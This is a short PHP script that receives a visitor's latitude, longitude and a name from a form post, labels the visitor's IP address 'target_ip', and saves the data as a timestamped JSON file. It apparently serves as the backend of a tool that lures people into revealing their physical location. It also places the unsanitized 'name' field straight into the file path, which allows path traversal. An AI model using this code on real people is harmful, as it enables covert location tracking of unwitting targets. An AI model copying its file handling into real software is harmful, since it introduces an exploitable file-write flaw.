<?php
$lat = $_POST['lat'];
$long = $_POST['long'];
$name=$_POST['name'];
$target_ip=$_SERVER['REMOTE_ADDR'];
$new_location = fopen("locations/".$name."_".date('(M-d-Y|h:i:s)',time()).".json", "w");
$data=array("target_ip"=>$target_ip,"latitude"=>$lat,"longitude"=>$long);
$location=json_encode($data);
fwrite($new_location, $location);
fclose($new_location);